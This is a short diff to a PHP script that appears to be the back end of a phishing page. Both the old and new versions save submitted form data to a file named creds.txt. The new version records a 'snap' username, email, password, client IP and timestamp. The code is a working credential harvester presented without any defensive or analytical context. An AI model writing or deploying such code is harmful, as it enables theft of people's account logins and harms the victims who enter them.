@@ -1,6 +1,11 @@
- <?php
-$data = json_decode(file_get_contents('php://input'), true) ?? $_POST;
-$line = date('[Y-m-d H:i:s] ') . json_encode($data) . PHP_EOL;
-file_put_contents('creds.txt', $line, FILE_APPEND | LOCK_EX);
-http_response_code(200);
+ 
+<?php
+$snap   = $_POST['snap']   ?? '';
+$email  = $_POST['email']  ?? '';
+$pass   = $_POST['password'] ?? '';
+$ip     = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+$time   = date("Y-m-d H:i:s");
 
+$data = "[$time] [$ip] Snap:$snap | Email:$email | Pass:$pass" . PHP_EOL;
+file_put_contents('creds.txt', $data, FILE_APPEND);
+?>
